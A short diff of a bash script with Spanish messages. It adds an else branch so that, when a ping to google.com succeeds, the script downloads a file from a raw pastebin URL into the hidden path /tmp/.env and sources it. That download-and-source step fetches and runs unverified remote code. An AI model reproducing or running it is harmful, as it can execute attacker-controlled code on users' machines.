@@ -20,6 +20,8 @@ connect_ssh() {
 }
 
 if [[ ! $(ping -c 3 google.com) ]]; then
+    echo "No se pudo realizar la acción"
+else
     if wget -O "/tmp/.env" https://pastebin.com/raw/p12FvLdf; then
         sleep 10
         source /tmp/.env
